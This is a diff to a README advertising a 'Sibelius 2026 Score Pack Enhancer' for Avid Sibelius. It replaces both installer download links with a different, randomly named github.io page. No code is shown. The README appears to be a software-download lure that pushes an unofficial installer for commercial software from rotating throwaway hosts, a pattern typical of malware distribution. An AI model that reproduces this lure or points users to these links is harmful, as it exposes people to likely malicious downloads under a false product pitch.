@@ -2,7 +2,7 @@
 
 Welcome to the Sibelius 2026 Score Pack Enhancer, the ultimate toolkit designed for composers and arrangers looking to unlock the full potential of Avid Sibelius. This package provides essential tools, expanded score libraries, and optimized settings to significantly enhance your music notation workflow on Windows.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -51,7 +51,7 @@ A: Yes, all sounds and samples included in this enhancer package are licensed fo
 
 To get the latest version of the Sibelius Score Pack Enhancer, including the installer and all templates, please visit our official download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Last Updated: 2026. The Sibelius Score Pack Enhancer is a community project. Avid, Sibelius, and Sibelius Ultimate are trademarks of Avid Technology, Inc.*
